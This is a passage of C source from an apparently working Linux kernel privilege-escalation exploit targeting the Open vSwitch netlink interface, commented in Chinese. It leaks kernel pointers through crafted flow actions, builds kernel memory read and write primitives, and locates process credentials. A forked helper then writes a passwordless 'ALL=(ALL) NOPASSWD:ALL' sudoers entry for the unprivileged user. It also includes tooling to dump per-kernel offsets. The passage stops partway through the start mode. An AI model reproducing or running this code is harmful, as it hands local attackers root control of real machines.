    pr_dim("  %s before=%u\n", label, v);
    if (v > 100000) {
        pr_err("  %s 的值 %u 异常偏大\n", label, v);
        return -1;
    }
    for (i = 0; i < v; i++) {
        if (decrement_once(w, addr) != 0) {
            pr_err("  %s 递减到 %u/%u 时失败\n", label, i, v);
            return -1;
        }
        if (i && i % 250 == 0)
            pr_dim("  %s: %u/%u\n", label, i, v);
    }
    sleep(2);
    if (ovs_read_u32(r, addr, &now) != 0)
        return -1;
    if (now != 0) {
        pr_err("  %s 没有归零，当前 %u\n", label, now);
        return -1;
    }
    pr_ok("  %s 已归零\n", label);
    return 0;
}

static int zero_to_all_ones(struct reader *r, struct writer *w, uint64_t addr,
                            const char *label)
{
    uint32_t v = 0;

    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    pr_dim("  %s before=0x%08x\n", label, v);
    if (v != 0) {
        pr_err("  %s 不是 0（0x%08x），旧内核 __refcnt 路径不适用\n", label, v);
        return -1;
    }
    if (decrement_once(w, addr) != 0)
        return -1;
    usleep(500 * 1000);
    if (ovs_read_u32(r, addr, &v) != 0)
        return -1;
    if (v != 0xFFFFFFFFu) {
        pr_err("  %s 没有回绕到 0xffffffff，当前 0x%08x\n", label, v);
        return -1;
    }
    pr_ok("  %s 已回绕为 0xffffffff\n", label);
    return 0;
}

static int panic_on_warn(void)
{
    char b[32] = { 0 };
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");

    if (!f)
        return 0;
    if (!fgets(b, sizeof(b), f)) {
        fclose(f);
        return 0;
    }
    fclose(f);
    return b[0] != '0' && b[0] != '\n' && b[0] != '\0';
}

/* -------------------------------------------------------------------------
 * host 侧：sudoers 写入子进程
 * ---------------------------------------------------------------------- */

struct host_user {
    uid_t uid;
    gid_t gid;
    char name[64];
};

static int read_self_status_cap(uint64_t *cap)
{
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];

    if (!f)
        return -1;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            fclose(f);
            *cap = strtoull(line + 7, NULL, 16);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static int check_launch_user(struct host_user *u)
{
    uint64_t cap = 0;

    u->uid = getuid();
    u->gid = getgid();
    if (u->uid == 0) {
        pr_err("当前是 root。这个 PoC 要在普通用户下跑，root 没有提权意义。\n");
        pr_dim("    用 su <普通用户> 切过去再运行。\n");
        return -1;
    }
    if (read_self_status_cap(&cap) == 0 && cap != 0) {
        pr_err("当前进程已经带有 capability（CapEff=0x%llx），不是干净起点。\n",
               (unsigned long long)cap);
        return -1;
    }
    {
        struct passwd *pw = getpwuid(u->uid);

        if (pw && pw->pw_name)
            snprintf(u->name, sizeof(u->name), "%s", pw->pw_name);
        else
            snprintf(u->name, sizeof(u->name), "uid%u", (unsigned)u->uid);
    }
    return u->name[0] ? 0 : -1;
}

static int sudo_works(void)
{
    char out[256];

    run_cmd("sudo -n true 2>&1", out, sizeof(out));
    return WEXITSTATUS(0) == 0 && out[0] == '\0';
}

static int sudoers_has_dropin(const char *line)
{
    return line && (!strncmp(line, "#includedir", 11) ||
                    !strncmp(line, "@includedir", 11));
}

static int write_sudoers_dropin(const char *path, const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "%s ALL=(ALL) NOPASSWD:ALL\n", user);
    mkdir("/etc/sudoers.d", 0755);
    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0440);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fchmod(fd, 0440);
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int append_main_sudoers(const char *user)
{
    char content[256];
    int fd;

    snprintf(content, sizeof(content), "\n%s ALL=(ALL:ALL) NOPASSWD:ALL\n", user);
    fd = open("/etc/sudoers", O_WRONLY | O_APPEND);
    if (fd < 0)
        return -1;
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        close(fd);
        return -1;
    }
    fsync(fd);
    close(fd);
    sync();
    return 0;
}

static int write_sudoers_entry(const char *dropin_path, const char *user,
                               char *used, size_t usedlen)
{
    FILE *f = fopen("/etc/sudoers", "r");
    int has_dropin = 0;

    if (f) {
        char line[512];

        while (fgets(line, sizeof(line), f)) {
            if (sudoers_has_dropin(line) && strstr(line, "/etc/sudoers.d")) {
                has_dropin = 1;
                break;
            }
        }
        fclose(f);
    }

    if (has_dropin && write_sudoers_dropin(dropin_path, user) == 0) {
        snprintf(used, usedlen, "%s", dropin_path);
        return 0;
    }
    if (append_main_sudoers(user) == 0) {
        snprintf(used, usedlen, "%s", "/etc/sudoers");
        return 0;
    }
    return -1;
}

static void sleep_forever_detached(void)
{
    setsid();
    {
        int fd = open("/dev/null", O_RDWR);

        if (fd >= 0) {
            dup2(fd, 0);
            dup2(fd, 1);
            dup2(fd, 2);
            if (fd > 2)
                close(fd);
        }
    }
    for (;;)
        sleep(3600);
}

/*
 * fork 出 host 侧的 sudoers writer。
 * 它一直等到 pipe 上出现 '1'，才把 cred 切到 0（内存已经被改过），
 * 写 sudoers，然后挂起不退 —— 保持进程存在，避免 OVS 里的
 * fake dst_entry 被释放回到 netns 重建路径上。
 */
static pid_t fork_sudoers_writer(const char *dropin, const char *user,
                                 int *trig_out, int *ack_out)
{
    int tr[2], ak[2];
    pid_t pid;

    if (pipe(tr) != 0 || pipe(ak) != 0)
        return -1;

    pid = fork();
    if (pid < 0)
        return -1;

    if (pid == 0) {
        char token = 0;
        char used[512] = "";
        char ack[600];
        int ok;

        close(tr[1]);
        close(ak[0]);

        if (read(tr[0], &token, 1) != 1 || token != '1') {
            close(tr[0]);
            close(ak[1]);
            _exit(1);
        }

        if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0)
            pr_dim("  writer: setresuid 未生效（依赖内存里已改好的 fsuid）\n");

        ok = write_sudoers_entry(dropin, user, used, sizeof(used)) == 0;
        snprintf(ack, sizeof(ack), ok ? "1 %s\n" : "0\n", used);
        (void)!write(ak[1], ack, strlen(ack));
        close(tr[0]);
        close(ak[1]);

        if (ok)
            sleep_forever_detached();
        _exit(0);
    }

    close(tr[0]);
    close(ak[1]);
    *trig_out = tr[1];
    *ack_out = ak[0];
    pr_dim("  host sudoers writer pid=%d\n", (int)pid);
    return pid;
}

/* -------------------------------------------------------------------------
 * namespace
 * ---------------------------------------------------------------------- */

static int write_map(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY);
    ssize_t n;

    if (fd < 0)
        return -1;
    n = write(fd, text, strlen(text));
    close(fd);
    return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int enter_private_ns(uid_t uid, gid_t gid)
{
    char map[64];

    if (unshare(CLONE_NEWUSER) != 0) {
        pr_err("unshare(CLONE_NEWUSER) 失败: %s\n", strerror(errno));
        pr_dim("    需要 kernel.unprivileged_userns_clone=1（Ubuntu 20.04 默认允许）\n");
        return -1;
    }
    /* 阻止 setgroups，否则 gid_map 写不进去 */
    write_map("/proc/self/setgroups", "deny");

    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)uid);
    if (write_map("/proc/self/uid_map", map) != 0) {
        pr_err("写 uid_map 失败: %s\n", strerror(errno));
        return -1;
    }
    snprintf(map, sizeof(map), "0 %u 1\n", (unsigned)gid);
    if (write_map("/proc/self/gid_map", map) != 0) {
        pr_err("写 gid_map 失败: %s\n", strerror(errno));
        return -1;
    }

    if (unshare(CLONE_NEWNET) != 0) {
        pr_err("unshare(CLONE_NEWNET) 失败: %s\n", strerror(errno));
        return -1;
    }
    if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0) {
        pr_err("进入 userns 后切换到 uid 0 失败: %s\n", strerror(errno));
        return -1;
    }
    return 0;
}

/* -------------------------------------------------------------------------
 * 从泄漏的 fake OUTPUT 里找 nf_conntrack_helper*
 * ---------------------------------------------------------------------- */

static int find_helper_pointer(const struct buf *actions, uint64_t *out)
{
    size_t off = 0;
    struct attr top;

    while (attr_next(actions->p, actions->len, &off, &top) == 0) {
        size_t i;
        uint64_t first = 0;

        if (top.type != OVS_ACTION_ATTR_OUTPUT || top.raw_len != 512)
            continue;

        for (i = 0; i + 8 <= top.len; i++) {
            uint64_t v;

            memcpy(&v, top.payload + i, 8);
            if (v < 0xFFFF800000000000ULL)
                continue;
            if (v >= 0xFFFFFFFFC0000000ULL && v <= 0xFFFFFFFFDFFFFFFFULL &&
                (v & 7) == 0) {
                *out = v;
                return 0;
            }
            if (!first)
                first = v;
        }
        if (first) {
            *out = first;
            return 0;
        }
    }
    return -1;
}

static int valid_vmlinux_base(uint64_t v)
{
    return v >= 0xFFFFFFFF80000000ULL && v <= 0xFFFFFFFFF0000000ULL &&
           (v % 0x200000ULL) == 0;
}

static int derive_helper_module_ktype(struct reader *r, uint64_t helper_me,
                                      uint64_t helper_ptr, uint64_t *out)
{
    uint64_t module_ptr = 0, ktype = 0;
    uint64_t ktype_addr;

    if (ovs_read_u64(r, helper_me, &module_ptr) != 0) {
        pr_err("  读 helper->me 失败\n");
        return -1;
    }
    module_ptr = canonicalize(module_ptr);

    if (!is_kernel_ptr(module_ptr) ||
        module_ptr < helper_ptr - 0x800000ULL ||
        module_ptr > helper_ptr + 0x800000ULL) {
        pr_err("  helper->me 读出来不是附近的 module 指针: "
               "helper=0x%llx me=0x%llx\n",
               (unsigned long long)helper_ptr,
               (unsigned long long)module_ptr);
        return -1;
    }

    ktype_addr = module_ptr + (uint64_t)r->k->module_kobj_ktype;
    if (ovs_read_u64(r, ktype_addr, &ktype) != 0)
        return -1;
    ktype = canonicalize(ktype);

    if (!valid_vmlinux_base(ktype - r->k->vmlinux_module_ktype)) {
        pr_err("  module.kobj.ktype @0x%llx = 0x%llx，与 vmlinux 符号偏移对不上\n",
               (unsigned long long)ktype_addr, (unsigned long long)ktype);
        return -1;
    }
    pr_dim("  helper->me = 0x%llx（已验证）\n", (unsigned long long)module_ptr);
    *out = ktype;
    return 0;
}

/* -------------------------------------------------------------------------
 * 建立整套原语
 * ---------------------------------------------------------------------- */

struct prim {
    struct genl g;
    struct koffs k;
    struct reader r;
    struct writer w;
    int dp_family;
    int flow_family;
    int dp_ifindex;
    uint64_t helper_ptr;
    uint64_t module_ktype;
    uint64_t kernel_base;
};

static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
{
    struct buf key, actions, leaked;
    unsigned char fake_output[8] = { 0, 2, OVS_ACTION_ATTR_OUTPUT, 0, 0, 0, 0, 0 };
    int ret;

    memset(p, 0, sizeof(*p));

    if (genl_open(&p->g) != 0) {
        pr_err("打开 NETLINK_GENERIC 失败: %s\n", strerror(errno));
        return -1;
    }

    ret = genl_get_family(&p->g, "ovs_datapath", &p->dp_family);
    if (ret < 0) {
        pr_err("找不到 ovs_datapath 这个 generic netlink family（%s）\n",
               strerror(-ret));
        pr_dim("    说明 openvswitch 模块没加载。先执行:\n"
               "      sudo modprobe openvswitch\n"
               "    然后重跑。（Ubuntu 需要装 linux-modules-extra 或 openvswitch 包）\n");
        return -1;
    }
    ret = genl_get_family(&p->g, "ovs_flow", &p->flow_family);
    if (ret < 0) {
        pr_err("找不到 ovs_flow family（%s）\n", strerror(-ret));
        return -1;
    }

    ret = ovs_create_datapath(&p->g, p->dp_family, dp_name);
    if (ret < 0) {
        pr_err("创建 datapath %s 失败: %s\n", dp_name, strerror(-ret));
        return -1;
    }
    p->dp_ifindex = if_nametoindex(dp_name);
    if (p->dp_ifindex <= 0) {
        pr_err("datapath %s 建好了但拿不到 ifindex\n", dp_name);
        return -1;
    }
    pr_dim("  datapath %s ifindex=%d\n", dp_name, p->dp_ifindex);

    if (derive_offsets(&p->k) != 0) {
        pr_err("内核偏移推导失败\n");
        return -1;
    }

    /*
     * 先用 helper 泄漏拿一个 nf_conntrack_helper 指针。
     * fake OUTPUT 的 nlattr 头是 len=512, type=OUTPUT；
     * 后面的 400 个 CT{COMMIT,HELPER} 让解析器越界读到它。
     */
    buf_init(&key, 256);
    buf_init(&actions, 32768);
    buf_init(&leaked, 65536);
    if (!key.p || !actions.p || !leaked.p) {
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }

    /* fake_output 的前两个字节是 len=0x0200(512) */
    fake_output[0] = 0x00;
    fake_output[1] = 0x02;

    flow_key(&key, 1);
    clone_with_helper_leak(&actions, fake_output, sizeof(fake_output));
    ret = ovs_create_flow(&p->g, p->flow_family, p->dp_ifindex, &key, &actions);
    if (ret < 0) {
        pr_err("建 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        buf_free(&key); buf_free(&actions); buf_free(&leaked);
        return -1;
    }
    ret = ovs_get_actions(&p->g, p->flow_family, p->dp_ifindex, &key, &leaked);
    ovs_delete_flow(&p->g, p->flow_family, p->dp_ifindex, &key);
    buf_free(&key);
    buf_free(&actions);
    if (ret < 0) {
        pr_err("读回 helper 泄漏 flow 失败: %s\n", strerror(-ret));
        buf_free(&leaked);
        return -1;
    }

    if (find_helper_pointer(&leaked, &p->helper_ptr) != 0) {
        buf_free(&leaked);
        pr_err("泄漏的 OUTPUT 里没有内核指针——这条链在这个内核上可能已修\n");
        return -1;
    }
    buf_free(&leaked);
    pr_dim("  泄漏到 helper 指针 0x%llx\n", (unsigned long long)p->helper_ptr);

    /* reader / writer */
    memset(&p->r, 0, sizeof(p->r));
    p->r.g = &p->g;
    p->r.flow_family = p->flow_family;
    p->r.dp_ifindex = p->dp_ifindex;
    p->r.k = &p->k;
    p->r.seq = 1000;
    p->r.carrier_mode = g_krec_hit.hit ? g_krec_hit.read_carrier : CARRIER_AUTO;
    p->r.ct_action_len = p->k.ovs_ct_action_len;
    p->r.labels_off = p->k.ovs_ct_labels;
    build_lanes(&p->k, p->r.lanes);

    memset(&p->w, 0, sizeof(p->w));
    p->w.g = &p->g;
    p->w.flow_family = p->flow_family;
    p->w.dp_ifindex = p->dp_ifindex;
    p->w.k = &p->k;
    p->w.seq = 100000000;
    p->w.carrier_mode = g_krec_hit.hit ? g_krec_hit.write_carrier : CARRIER_AUTO;
    p->w.ct_action_len = p->k.ovs_ct_action_len;
    p->w.labels_off = p->k.ovs_ct_labels;

    if (verbose)
        pr_dim("  ct_action_len=%d labels_off=%d dst_ref_kind=%s\n",
               p->k.ovs_ct_action_len, p->k.ovs_ct_labels,
               p->k.ref_kind == 0 ? "__rcuref" : "__refcnt");

    if (derive_helper_module_ktype(&p->r,
                                   p->helper_ptr + (uint64_t)p->k.nf_conntrack_helper_me,
                                   p->helper_ptr, &p->module_ktype) != 0)
        return -1;

    p->kernel_base = p->module_ktype - p->k.vmlinux_module_ktype;
    pr_dim("  module_ktype=0x%llx kernel_base=0x%llx\n",
           (unsigned long long)p->module_ktype,
           (unsigned long long)p->kernel_base);
    return 0;
}

/* -------------------------------------------------------------------------
 * -dump-krec：把本机推导出的偏移打成一条记录，喂给 tools/add_krec.py
 * ---------------------------------------------------------------------- */

static const char *g_dump_carrier = "timeout";
static const char *g_dump_wcarrier;
static const char *g_dump_from;
static int g_dump_tunnel_info = 31;
static int g_dump_lanes[N_LANES];
static int g_dump_lane_count;
static int g_dump_carrier_set, g_dump_lanes_set, g_dump_ti_set;
static int g_dump_target;      /* -dump-target：输出 target.h 而不是 JSON */

/* -------------------------------------------------------------------------
 * -dump-target：输出一张可直接放进 offset/ 的 target.h
 * ---------------------------------------------------------------------- */

static void print_target(const struct koffs *k, const struct utsname *u)
{
    char ts[64];
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    int i;

    if (!tm || !strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm))
        snprintf(ts, sizeof(ts), "unknown");

    printf("/*\n"
           " * target.h - dirtyfrag OVS (CVE-2026-64531) kernel offsets\n"
           " *\n"
           " * 放这里：offset/<N>系/<release>/target.h\n"
           " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
           " *\n"
           " * 程序启动时按目录名找本机 release，不需要重新编译。\n"
           " * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。\n"
           " *\n"
           " * 生成: ovswrap -dump-target    %s\n"
           " */\n"
           "#ifndef DIRTYFRAG_TARGET_H\n"
           "#define DIRTYFRAG_TARGET_H\n\n", ts);
    printf("#define KREC_FORMAT        1\n");
    printf("#define KREC_RELEASE       \"%s\"\n", u->release);
    printf("#define KREC_VERSION       \"%s\"\n", u->version);
    printf("#define KREC_VERSION_HASH  %luUL\n", fnv1a32(u->version));
    printf("#define KREC_MACHINE       \"%s\"\n\n", u->machine);

    printf("/* 符号偏移：相对 _text，与 KASLR 无关 */\n");
    printf("#define KREC_VMLINUX_MODULE_KTYPE %luUL\n", k->vmlinux_module_ktype);
    printf("#define KREC_VMLINUX_INIT_PID_NS  %luUL\n\n", k->vmlinux_init_pid_ns);

    printf("/* 结构体字段偏移 */\n");
#define TH_OUT(n, f) printf("#define %-30s %d\n", "KREC_" #n, k->f)
    TH_OUT(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me);
    TH_OUT(MODULE_KOBJ_KTYPE, module_kobj_ktype);
    TH_OUT(TASK_PID, task_pid);
    TH_OUT(TASK_CRED, task_cred);
    TH_OUT(TASK_PID_LINKS, task_pid_links);
    TH_OUT(CRED_FSUID, cred_fsuid);
    TH_OUT(CRED_FSGID, cred_fsgid);
    TH_OUT(CRED_CAP_PERMITTED, cred_cap_permitted);
    TH_OUT(CRED_CAP_EFFECTIVE, cred_cap_effective);
    TH_OUT(PID_NAMESPACE_IDR, pid_namespace_idr);
    TH_OUT(IDR_IDR_RT, idr_idr_rt);
    TH_OUT(IDR_BASE, idr_base);
    TH_OUT(XARRAY_XA_HEAD, xarray_xa_head);
    TH_OUT(XA_NODE_SHIFT, xa_node_shift);
    TH_OUT(XA_NODE_SLOTS, xa_node_slots);
    TH_OUT(PID_TASKS, pid_tasks);
    TH_OUT(HLIST_HEAD_FIRST, hlist_head_first);
    TH_OUT(DST_ENTRY_REF, dst_entry_ref);
    TH_OUT(METADATA_DST_TUN_INFO, metadata_dst_tun_info);
    TH_OUT(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src);
    TH_OUT(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst);
    TH_OUT(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos);
    TH_OUT(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl);
    TH_OUT(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src);
    TH_OUT(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst);
    TH_OUT(OVS_CT_LABELS, ovs_ct_labels);
    TH_OUT(OVS_CT_ACTION_LEN, ovs_ct_action_len);
#undef TH_OUT

    printf("\n/* 行为参数：从调试信息推不出来，只能实机试 */\n");
    printf("#define KREC_REF_KIND      \"%s\"\n",
           k->ref_kind ? "__refcnt" : "__rcuref");
    printf("#define KREC_TUNNEL_INFO   %d\n", g_dump_tunnel_info);
    printf("#define KREC_READ_CARRIER  \"%s\"\n", g_dump_carrier);
    printf("#define KREC_WRITE_CARRIER \"%s\"\n",
           g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("#define KREC_READ_LANES    \"");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s%s", i ? "," : "", krec_lane_names[g_dump_lanes[i]]);
    printf("\"\n\n#endif /* DIRTYFRAG_TARGET_H */\n");

    {
        char major[8] = "?";

        th_major(u->release, major, sizeof(major));
        fprintf(stderr, "\n放到 offset/%s系/%s/target.h 即可（目录名 = uname -r）。\n",
                major, u->release);
    }
}

static void json_escape(const char *s)
{
    putchar('"');
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;

        if (c == '"' || c == '\\')
            printf("\\%c", c);
        else if (c < 0x20)
            printf("\\u%04x", c);
        else
            putchar(c);
    }
    putchar('"');
}

static int dump_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < N_LANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "-lanes ttl,tos,tp_src_0" -> 下标数组 */
static int parse_dump_lanes(const char *arg)
{
    g_dump_lane_count = 0;
    while (*arg) {
        const char *comma = strchr(arg, ',');
        size_t len = comma ? (size_t)(comma - arg) : strlen(arg);
        int id = dump_lane_id(arg, len);

        if (id < 0) {
            fprintf(stderr, "未知 lane: %.*s\n", (int)len, arg);
            return -1;
        }
        if (g_dump_lane_count < N_LANES)
            g_dump_lanes[g_dump_lane_count++] = id;
        if (!comma)
            break;
        arg = comma + 1;
    }
    return 0;
}

static int do_dump_krec(void)
{
    struct koffs k;
    struct utsname u;
    int saved, rc, i;

    if (uname(&u) != 0) {
        fprintf(stderr, "uname 失败: %s\n", strerror(errno));
        return 1;
    }

    if (g_dump_from) {
        /* 从表里抄一条：没有 BTF / pahole 时也能造出记录骨架 */
        const unsigned char *rec;
        int exact = 0, idx;

        if (krec_load(&g_krec) != 0) {
            fprintf(stderr, "预置表数据损坏\n");
            return 1;
        }
        idx = krec_lookup(&g_krec, g_dump_from, 0, &exact);
        if (idx < 0) {
            fprintf(stderr, "预置表里没有 release=%s\n", g_dump_from);
            return 1;
        }
        rec = g_krec.rec_tab + (size_t)idx * KREC_REC_STRIDE;
        krec_apply_offsets(&g_krec, krec_u16(rec + 8), &k);
        memset(&g_krec_hit, 0, sizeof(g_krec_hit));
        krec_apply_combo(&g_krec, rec[10]);

        /* 没显式指定的行为参数沿用被抄的那条 */
        if (!g_dump_carrier_set) {
            g_dump_carrier = g_krec_hit.read_carrier ? "labels-only" : "timeout";
            g_dump_wcarrier = g_krec_hit.write_carrier ? "labels-only" : "timeout";
        }
        if (!g_dump_lanes_set) {
            g_dump_lane_count = g_krec_hit.lane_count;
            memcpy(g_dump_lanes, g_krec_hit.lane_order,
                   sizeof(g_dump_lanes[0]) * (size_t)g_dump_lane_count);
        }
        if (!g_dump_ti_set)
            g_dump_tunnel_info = g_krec_hit.tunnel_info;

        fprintf(stderr, "注意：偏移抄自 %s，不是本机推导。\n", g_dump_from);
    } else {
        /* 推导过程的中文诊断全部导到 stderr，stdout 只留 JSON */
        fflush(stdout);
        saved = dup(STDOUT_FILENO);
        if (saved >= 0)
            dup2(STDERR_FILENO, STDOUT_FILENO);
        g_force_derive = 1;
        rc = derive_offsets(&k);
        fflush(stdout);
        if (saved >= 0) {
            dup2(saved, STDOUT_FILENO);
            close(saved);
        }
        if (rc != 0) {
            fprintf(stderr, "\n推导失败。需要 pahole（sudo apt install dwarves）"
                            "和符号表：\n"
                            "  /boot/System.map-%s，或 root 读 /proc/kallsyms。\n"
                            "如果卡在 ovs_conntrack_info：先 sudo modprobe "
                            "openvswitch 再试。\n", u.release);
            return 1;
        }
    }

    if (!g_dump_lane_count) {          /* 没指定就按默认全量顺序 */
        for (i = 0; i < N_LANES; i++)
            g_dump_lanes[i] = i;
        g_dump_lane_count = N_LANES;
    }
    if (g_dump_target) {
        print_target(&k, &u);
        return 0;
    }

    printf("{\n  \"release\": ");
    json_escape(u.release);
    printf(",\n  \"version\": ");
    json_escape(u.version);
    printf(",\n  \"machine\": ");
    json_escape(u.machine);
    printf(",\n  \"offsets\": {\n");

#define KREC_JSON_INT(name) \
    printf("    \"" #name "\": %d,\n", k.name)

    KREC_JSON_INT(nf_conntrack_helper_me);
    KREC_JSON_INT(module_kobj_ktype);
    KREC_JSON_INT(task_pid);
    KREC_JSON_INT(task_cred);
    KREC_JSON_INT(task_pid_links);
    KREC_JSON_INT(cred_fsuid);
    KREC_JSON_INT(cred_fsgid);
    KREC_JSON_INT(cred_cap_permitted);
    KREC_JSON_INT(cred_cap_effective);
    KREC_JSON_INT(pid_namespace_idr);
    KREC_JSON_INT(idr_idr_rt);
    KREC_JSON_INT(idr_base);
    KREC_JSON_INT(xarray_xa_head);
    KREC_JSON_INT(xa_node_shift);
    KREC_JSON_INT(xa_node_slots);
    KREC_JSON_INT(pid_tasks);
    KREC_JSON_INT(hlist_head_first);
    KREC_JSON_INT(dst_entry_ref);
    KREC_JSON_INT(metadata_dst_tun_info);
    KREC_JSON_INT(ip_tunnel_key_ipv4_src);
    KREC_JSON_INT(ip_tunnel_key_ipv4_dst);
    KREC_JSON_INT(ip_tunnel_key_tos);
    KREC_JSON_INT(ip_tunnel_key_ttl);
    KREC_JSON_INT(ip_tunnel_key_tp_src);
    KREC_JSON_INT(ip_tunnel_key_tp_dst);
    KREC_JSON_INT(ovs_ct_labels);
    printf("    \"ovs_ct_action_len\": %d,\n", k.ovs_ct_action_len);
#undef KREC_JSON_INT
    printf("    \"vmlinux_module_ktype\": %lu,\n", k.vmlinux_module_ktype);
    printf("    \"vmlinux_init_pid_ns\": %lu,\n", k.vmlinux_init_pid_ns);
    printf("    \"dst_entry_ref_kind\": \"%s\"\n",
           k.ref_kind ? "__refcnt" : "__rcuref");
    printf("  },\n  \"read_carrier\": \"%s\",\n  \"write_carrier\": \"%s\",\n",
           g_dump_carrier, g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("  \"read_lanes\": [");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s\"%s\"", i ? ", " : "", krec_lane_names[g_dump_lanes[i]]);
    printf("],\n  \"ovs_key_attr_tunnel_info\": %d\n}\n", g_dump_tunnel_info);

    fprintf(stderr, "\n存成 rec.json，然后：python3 tools/add_krec.py rec.json ovswrap.c\n"
                    "行为参数（carrier / lanes / tunnel_info）本机推导不出来，"
                    "用 -carrier / -lanes / -tunnel-info 覆盖。\n");
    return 0;
}

/* -------------------------------------------------------------------------
 * 三个模式
 * ---------------------------------------------------------------------- */

static int file_readable(const char *path)
{
    return access(path, R_OK) == 0;
}

static int do_check(void)
{
    FILE *f;
    char buf[256];
    int fails = 0;

    pr_dim("  uname: ");
    if (run_cmd("uname -a", buf, sizeof(buf)) > 0) {
        buf[strcspn(buf, "\n")] = '\0';
        pr_raw("%s\n", buf);
    }

    pr_dim("  openvswitch 模块: ");
    if (access("/sys/module/openvswitch", F_OK) == 0)
        pr_ok("已加载\n");
    else {
        pr_err("未加载\n");
        pr_dim("    先 sudo modprobe openvswitch；Ubuntu 上需要\n"
               "    linux-modules-extra-$(uname -r) 或 openvswitch 包。\n");
        fails++;
    }

    /* 先看预置表：命中的话下面三项本地推导都不需要 */
    {
        struct koffs probe;

        if (krec_resolve(&probe) != 0) {
            pr_dim("  本地推导（预置表未命中）：\n");

            pr_dim("    BTF: ");
            if (file_readable(BTF_VMLINUX))
                pr_ok("%s 可读\n", BTF_VMLINUX);
            else {
                pr_err("不可读\n");
                pr_dim("      需要 CONFIG_DEBUG_INFO_BTF；Ubuntu 20.04 的 5.4/5.8 内核\n"
                       "      多半没有，可以改装带 BTF 的 HWE 内核。\n");
                fails++;
            }

            pr_dim("    pahole: ");
            if (have_binary("pahole"))
                pr_ok("已安装\n");
            else {
                pr_err("缺失\n");
                pr_dim("      sudo apt install dwarves\n");
                fails++;
            }

            pr_dim("    符号表: ");
            {
                struct koffs k;

                if (derive_symbols(&k) == 0)
                    pr_ok("可用（module_ktype=0x%lx init_pid_ns=0x%lx 相对 _text）\n",
                          k.vmlinux_module_ktype, k.vmlinux_init_pid_ns);
                else {
                    pr_err("不可用\n");
                    pr_dim("      /proc/kallsyms 的地址被 kptr_restrict 清零时，\n"
                           "      需要 /boot/System.map-$(uname -r)（linux-image 包自带）。\n");
                    fails++;
                }
            }
        } else {
            pr_dim("  BTF / pahole / System.map: 不需要（偏移来自 %s）\n",
                   g_krec_src[0] ? g_krec_src : "预置表");
        }
    }

    pr_dim("  unprivileged_userns_clone: ");
    f = fopen("/proc/sys/kernel/unprivileged_userns_clone", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = '\0';
            if (!strcmp(buf, "1"))
                pr_ok("1\n");
            else {
                pr_err("%s\n", buf);
                fails++;
            }
        }
        fclose(f);
    } else {
        pr_dim("（内核没有这个开关，视为允许）\n");
    }

    pr_dim("  sudo 基线: ");
    if (sudo_works())
        pr_err("当前用户已有免密 sudo，root shell 没有对比意义\n");
    else
        pr_ok("需要密码（正常）\n");

    printf("\n");
    if (fails == 0)
        pr_ok("前置条件齐全，可以跑 -scan 或 -start。\n");
    else
        pr_err("有 %d 项不满足，直接跑会在对应步骤停下（不会破坏系统）。\n", fails);
    return fails == 0 ? 0 : 1;
}

static int do_scan(struct prim *p)
{
    uint64_t v = 0;

    pr_step("自检：读 vmlinux 里的 module_ktype");
    {
        uint64_t addr = p->kernel_base + p->k.vmlinux_module_ktype;

        if (read_kptr(&p->r, addr, "module_ktype", &v) != 0)
            return -1;
        if (v != p->module_ktype) {
            pr_err("  读回 0x%llx，与泄漏推导的 0x%llx 不一致\n",
                   (unsigned long long)v, (unsigned long long)p->module_ktype);
            return -1;
        }
        pr_ok("  读回一致: 0x%llx\n", (unsigned long long)v);
    }

    pr_step("自检：定位当前进程的 task_struct");
    {
        uint64_t task = 0;

        if (locate_task(&p->r, p->kernel_base, getpid(), &task) != 0)
            return -1;
        pr_ok("  当前 pid=%d task=0x%llx\n", getpid(), (unsigned long long)task);
    }

    printf("\n");
    pr_ok("读原语可用；写原语未执行（-scan 不会修改任何东西）。\n");
    pr_dim("    要真正提权，用 -start。\n");
    return 0;
}

static int do_start(struct prim *p, int writer_pid, int trig_fd, int ack_fd)
{
    uint64_t task = 0, cred = 0;
    char ack[600];
    int total = 0;
    ssize_t n;

    pr_step("定位 host writer 的 cred");
    if (locate_task(&p->r, p->kernel_base, writer_pid, &task) != 0)
        return -1;
    if (read_kptr(&p->r, task + (uint64_t)p->k.task_cred, "task->cred", &cred) != 0)
        return -1;
